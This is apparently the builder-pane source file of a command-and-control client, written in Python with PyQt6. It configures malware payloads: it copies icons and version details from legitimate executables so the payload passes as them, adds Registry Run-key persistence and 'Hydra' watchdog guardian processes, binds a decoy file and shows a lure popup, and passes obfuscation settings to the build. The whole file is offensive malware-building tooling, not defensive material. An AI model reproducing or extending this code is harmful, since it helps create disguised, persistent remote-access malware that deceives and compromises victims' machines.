# C2_Client/ui/builder_pane.py
import os
import uuid
import tempfile
import re
import pefile
from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QLineEdit, QPushButton,
                             QTextEdit, QCheckBox, QComboBox, QSpinBox, QGroupBox,
                             QFileDialog, QLabel, QStackedWidget, QMessageBox, QFormLayout,
                             QScrollArea)
from PyQt6.QtCore import pyqtSignal, Qt

class BuilderPane(QWidget):
    build_requested = pyqtSignal(dict)
    stop_build_requested = pyqtSignal() # ADDED: Signal to stop the build

    def __init__(self, db_manager):
        super().__init__()
        self.db = db_manager
        self.bind_file_path = None
        self.active_icon_path = None
        self.hydra_inputs = []

        self.stack = QStackedWidget()
        main_layout = QVBoxLayout(self); main_layout.setContentsMargins(0,0,0,0)
        main_layout.addWidget(self.stack)

        builder_scroll_area = QScrollArea()
        builder_scroll_area.setWidgetResizable(True)
        builder_scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        builder_widget = QWidget()
        builder_scroll_area.setWidget(builder_widget)

        layout = QVBoxLayout(builder_widget)
        layout.setContentsMargins(10,10,10,10); layout.setSpacing(10)
        
        layout.addWidget(QLabel("<h2>BUILDER</h2>"))

        # --- Main Payload Group ---
        main_payload_group = QGroupBox("Main Payload")
        main_payload_layout = QVBoxLayout(main_payload_group)
        main_payload_layout.setContentsMargins(10, 15, 10, 10)
        name_ext_layout = QHBoxLayout()
        self.payload_name = QLineEdit("TetherPayload")
        self.payload_ext = QLineEdit(".exe")
        self.payload_ext.setFixedWidth(80)
        name_ext_layout.addWidget(self.payload_name, 3); name_ext_layout.addWidget(self.payload_ext, 1)
        main_payload_layout.addLayout(name_ext_layout)
        layout.addWidget(main_payload_group)
        
        # --- Cloning / Spoofing Group ---
        cloning_group = QGroupBox("Payload Appearance & Spoofing")
        cloning_layout = QVBoxLayout(cloning_group)
        cloning_layout.setContentsMargins(10, 15, 10, 10)
        self.customize_details_checkbox = QCheckBox("Customize File Properties")
        self.customize_details_checkbox.stateChanged.connect(self.toggle_details_view)
        cloning_layout.addWidget(self.customize_details_checkbox)
        self.details_group = QGroupBox("Custom Properties"); self.details_group.setVisible(False)
        details_layout = QFormLayout(self.details_group)
        
        self.clone_target_button = QPushButton("Clone Executable Icon"); self.clone_target_button.clicked.connect(self.select_clone_target)
        
        self.target_label = QLabel("Source: None")
        details_layout.addRow(self.target_label); details_layout.addRow(self.clone_target_button)
        self.clone_file_description = QLineEdit(); self.clone_file_description.setPlaceholderText("File Description")
        details_layout.addRow(self.clone_file_description)
        self.clone_company_name = QLineEdit(); self.clone_company_name.setPlaceholderText("Company Name")
        details_layout.addRow(self.clone_company_name)
        self.clone_product_name = QLineEdit(); self.clone_product_name.setPlaceholderText("Product Name")
        details_layout.addRow(self.clone_product_name)
        self.clone_original_filename = QLineEdit(); self.clone_original_filename.setPlaceholderText("Original Filename")
        details_layout.addRow(self.clone_original_filename)
        self.clone_legal_copyright = QLineEdit(); self.clone_legal_copyright.setPlaceholderText("Legal Copyright")
        details_layout.addRow(self.clone_legal_copyright)
        self.clone_file_version = QLineEdit(); self.clone_file_version.setPlaceholderText("File Version (e.g., 1.2.3.4)")
        details_layout.addRow(self.clone_file_version)
        cloning_layout.addWidget(self.details_group)
        layout.addWidget(cloning_group)

        # --- Resilience Group ---
        persist_group = QGroupBox("Resilience")
        persist_layout = QVBoxLayout(persist_group)
        persist_layout.setContentsMargins(10, 15, 10, 10)
        self.startup_persist = QCheckBox("Startup Persistence (Adds to Registry Run key)")
        persist_layout.addWidget(self.startup_persist)
        
        hydra_header_layout = QHBoxLayout()
        self.hydra_revival = QCheckBox("Hydra Revival (Watchdog)")
        self.hydra_amount = QSpinBox()
        self.hydra_amount.setRange(2, 5); self.hydra_amount.valueChanged.connect(self.update_hydra_inputs); self.hydra_amount.setVisible(False)
        hydra_header_layout.addWidget(self.hydra_revival); hydra_header_layout.addWidget(self.hydra_amount); hydra_header_layout.addStretch()
        persist_layout.addLayout(hydra_header_layout)
        
        self.hydra_guardian_group = QGroupBox("Guardian Configuration"); self.hydra_guardian_group.setVisible(False)
        self.hydra_guardian_layout = QVBoxLayout(self.hydra_guardian_group)
        persist_layout.addWidget(self.hydra_guardian_group)
        self.hydra_revival.stateChanged.connect(self.toggle_hydra_options)
        layout.addWidget(persist_group)

        # --- Deception & Lures Group ---
        deception_group = QGroupBox("Deception & Lures"); 
        deception_layout = QVBoxLayout(deception_group)
        deception_layout.setContentsMargins(10, 15, 10, 10)
        self.custom_popup_checkbox = QCheckBox("Show Custom Popup on First Execution"); deception_layout.addWidget(self.custom_popup_checkbox)
        self.custom_popup_group = QGroupBox("Popup Message"); self.custom_popup_group.setVisible(False)
        popup_layout = QFormLayout(self.custom_popup_group)
        self.popup_title_input = QLineEdit(); self.popup_title_input.setPlaceholderText("Popup Title")
        self.popup_message_input = QTextEdit(); self.popup_message_input.setPlaceholderText("Popup Message")
        self.popup_message_input.setMaximumHeight(80)
        popup_layout.addRow(self.popup_title_input); popup_layout.addRow(self.popup_message_input)
        deception_layout.addWidget(self.custom_popup_group); self.custom_popup_checkbox.stateChanged.connect(self.custom_popup_group.setVisible)
        bind_layout = QHBoxLayout(); self.bind_file_button = QPushButton("Bind Decoy File (Runs on execution)"); self.bind_file_button.clicked.connect(self.select_bind_file); self.bind_label = QLabel("None")
        bind_layout.addWidget(self.bind_file_button); bind_layout.addWidget(self.bind_label, 1); deception_layout.addLayout(bind_layout); layout.addWidget(deception_group)
        
        layout.addStretch()

        self.build_button = QPushButton("Build Payload"); self.build_button.clicked.connect(self.on_build); layout.addWidget(self.build_button)
        
        self.build_log_pane = QWidget(); log_layout = QVBoxLayout(self.build_log_pane); self.build_log_output = QTextEdit(); self.build_log_output.setReadOnly(True)
        self.stop_build_button = QPushButton("Stop Build"); self.stop_build_button.setObjectName("StopBuildButton")
        self.stop_build_button.setEnabled(False)
        self.stop_build_button.hide() # Hide by default
        self.stop_build_button.clicked.connect(self.stop_build_requested.emit) # Connect to signal
        self.back_to_builder_button = QPushButton("< Back to Builder"); self.back_to_builder_button.clicked.connect(self.show_builder_pane); self.back_to_builder_button.hide()
        log_layout.addWidget(QLabel("<h3>BUILDING PAYLOAD...</h3>")); log_layout.addWidget(self.build_log_output, 1); log_layout.addWidget(self.stop_build_button); log_layout.addWidget(self.back_to_builder_button)
        
        self.stack.addWidget(builder_scroll_area); self.stack.addWidget(self.build_log_pane)
        self.update_hydra_inputs(self.hydra_amount.value())

    def on_build(self):
        try:
            if not self.payload_name.text():
                QMessageBox.warning(self, "Warning", "Payload name cannot be empty."); return
            
            guardian_configs = []
            if self.hydra_revival.isChecked():
                for i, data in enumerate(self.hydra_inputs):
                    guardian_name = data["name_widget"].text().strip()
                    if not guardian_name:
                        QMessageBox.warning(self, "Warning", f"Guardian #{i+1} name cannot be empty."); return
                    guardian_configs.append({
                        "name": guardian_name, 
                        "ext": data["ext_widget"].text().strip() or ".exe",
                        "icon": data["icon_path"]
                    })

            settings = {
                "payload_name": self.payload_name.text().strip(), 
                "payload_ext": self.payload_ext.text().strip() or ".exe",
                "cloning": { 
                    "enabled": self.customize_details_checkbox.isChecked(), 
                    "icon": self.active_icon_path, 
                    "version_info": { 
                        "FileDescription": self.clone_file_description.text(), 
                        "CompanyName": self.clone_company_name.text(), 
                        "ProductName": self.clone_product_name.text(), 
                        "OriginalFilename": self.clone_original_filename.text(), 
                        "LegalCopyright": self.clone_legal_copyright.text(), 
                        "FileVersion": self.clone_file_version.text()
                    } 
                },
                "persistence": self.startup_persist.isChecked(),
                "hydra": self.hydra_revival.isChecked(), 
                "guardians": guardian_configs,
                "popup_enabled": self.custom_popup_checkbox.isChecked(), 
                "popup_title": self.popup_title_input.text(), 
                "popup_message": self.popup_message_input.toPlainText(),
                "bind_path": self.bind_file_path,
                "compression": self.db.load_setting("compression", "None"),
                "obfuscation": self.db.load_setting("obfuscation", "None"),
                "simple_logs": self.db.load_setting("simple_logs", True)
            }
            self.build_requested.emit(settings)
        except Exception as e:
            QMessageBox.critical(self, "Build Error", f"An unexpected error occurred during build preparation:\n{e}")

    def toggle_details_view(self, checked): self.details_group.setVisible(checked)
    def toggle_hydra_options(self, checked):
        self.hydra_amount.setVisible(checked)
        self.hydra_guardian_group.setVisible(checked)

    def update_hydra_inputs(self, amount):
        while self.hydra_guardian_layout.count():
            child = self.hydra_guardian_layout.takeAt(0)
            if child.widget(): child.widget().deleteLater()
        self.hydra_inputs.clear()
        for i in range(amount):
            input_data = {}
            row_widget = QWidget()
            layout = QVBoxLayout(row_widget); layout.setContentsMargins(0,5,0,5)
            name_layout = QHBoxLayout()
            name_input = QLineEdit(f"Guardian_{i+1}")
            ext_input = QLineEdit(".exe"); ext_input.setFixedWidth(80)
            name_layout.addWidget(name_input, 3); name_layout.addWidget(ext_input, 1)
            input_data["name_widget"] = name_input; input_data["ext_widget"] = ext_input
            
            icon_layout = QHBoxLayout()
            icon_button = QPushButton("Clone Guardian Icon")
            icon_button.clicked.connect(lambda chk, index=i: self.select_guardian_icon(index))
            icon_label = QLabel("Icon: None"); input_data["icon_button"] = icon_button; input_data["icon_label"] = icon_label; input_data["icon_path"] = None
            icon_layout.addWidget(icon_label, 1); icon_layout.addWidget(icon_button)
            
            layout.addLayout(name_layout); layout.addLayout(icon_layout)
            self.hydra_guardian_layout.addWidget(row_widget)
            self.hydra_inputs.append(input_data)
            
    def _extract_icon(self, pe, icon_path):
        try:
            rt_grp_icon_dir_entry = next(e for e in pe.DIRECTORY_ENTRY_RESOURCE.entries if e.id == pefile.RESOURCE_TYPE['RT_GROUP_ICON'])
            rt_grp_icon_dir = rt_grp_icon_dir_entry.directory; icon_group_entry = rt_grp_icon_dir.entries[0]; icon_data_entry = icon_group_entry.directory.entries[0].data; grp_icon_data = pe.get_memory_mapped_image()[icon_data_entry.struct.OffsetToData:icon_data_entry.struct.OffsetToData + icon_data_entry.struct.Size]; entry_count = int.from_bytes(grp_icon_data[4:6], 'little'); best_entry = grp_icon_data[6:22]; max_size = 0
            for i in range(entry_count):
                entry = grp_icon_data[6 + i * 16 : 22 + i * 16]; width, height = entry[0], entry[1]
                if width == 0: width = 256
                if height == 0: height = 256
                if width * height > max_size: max_size = width * height; best_entry = entry
            icon_id = int.from_bytes(best_entry[12:14], 'little'); rt_icon_dir = next(e for e in pe.DIRECTORY_ENTRY_RESOURCE.entries if e.id == pefile.RESOURCE_TYPE['RT_ICON']).directory; icon_res_entry = next(e for e in rt_icon_dir.entries if e.id == icon_id); icon_data_rva = icon_res_entry.directory.entries[0].data.struct.OffsetToData; icon_size = icon_res_entry.directory.entries[0].data.struct.Size; icon_data = pe.get_memory_mapped_image()[icon_data_rva:icon_data_rva + icon_size]; ico_header = b'\x00\x00\x01\x00\x01\x00'; ico_dir_entry = best_entry[:8] + icon_size.to_bytes(4, 'little') + (22).to_bytes(4, 'little')
            with open(icon_path, 'wb') as f: f.write(ico_header); f.write(ico_dir_entry); f.write(icon_data)
        except Exception as e: raise Exception(f"Failed during icon extraction: {e}")

    def _clone_properties_from_path(self, path, on_success, on_error):
        try:
            pe = pefile.PE(path, fast_load=True); pe.parse_data_directories(directories=[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_RESOURCE']])
            icon_path = os.path.join(tempfile.gettempdir(), f"tether_{uuid.uuid4().hex}.ico"); self._extract_icon(pe, icon_path)
            version_info = {}
            if hasattr(pe, 'VS_VERSIONINFO') and pe.VS_VERSIONINFO and hasattr(pe.VS_VERSIONINFO[0], 'StringFileInfo') and pe.VS_VERSIONINFO[0].StringFileInfo:
                lang_entry = pe.VS_VERSIONINFO[0].StringFileInfo[0].entries; version_info = { k.decode('utf-8', 'ignore'): v.decode('utf-8', 'ignore') for k, v in lang_entry.items() }
            on_success(path, icon_path, version_info)
        except Exception as e: QMessageBox.critical(self, "Error Extracting Properties", str(e)); on_error()

    def select_clone_target(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select Target Executable", "", "Executables (*.exe)");
        if path:
            def on_success(p, icon_p, v_info):
                self.active_icon_path = icon_p; self.target_label.setText(f"Cloned: {os.path.basename(p)}")
                if self.customize_details_checkbox.isChecked():
                    self.clone_file_description.setText(v_info.get("FileDescription", "")); self.clone_company_name.setText(v_info.get("CompanyName", ""))
                    self.clone_product_name.setText(v_info.get("ProductName", "")); self.clone_original_filename.setText(v_info.get("OriginalFilename", ""))
                    self.clone_legal_copyright.setText(v_info.get("LegalCopyright", "")); self.clone_file_version.setText(v_info.get("FileVersion", ""))
            def on_error(): self.active_icon_path = None; self.target_label.setText("Source: None")
            self._clone_properties_from_path(path, on_success, on_error)
            
    def select_guardian_icon(self, index):
        path, _ = QFileDialog.getOpenFileName(self, "Select Executable for Guardian Icon", "", "Executables (*.exe)")
        if path:
            def on_success(p, icon_p, v_info):
                self.hydra_inputs[index]["icon_path"] = icon_p
                self.hydra_inputs[index]["icon_label"].setText(f"Icon from: {os.path.basename(p)}")
            def on_error():
                self.hydra_inputs[index]["icon_path"] = None
                self.hydra_inputs[index]["icon_label"].setText("Icon: None")
            self._clone_properties_from_path(path, on_success, on_error)

    def select_bind_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select File to Bind");
        if path: self.bind_file_path = path; self.bind_label.setText(os.path.basename(path))

    def show_build_log_pane(self):
        self.build_log_output.clear()
        self.back_to_builder_button.hide()
        self.stop_build_button.show()
        self.stop_build_button.setEnabled(True)
        self.stack.setCurrentIndex(1)

    def show_builder_pane(self):
        self.stack.setCurrentIndex(0)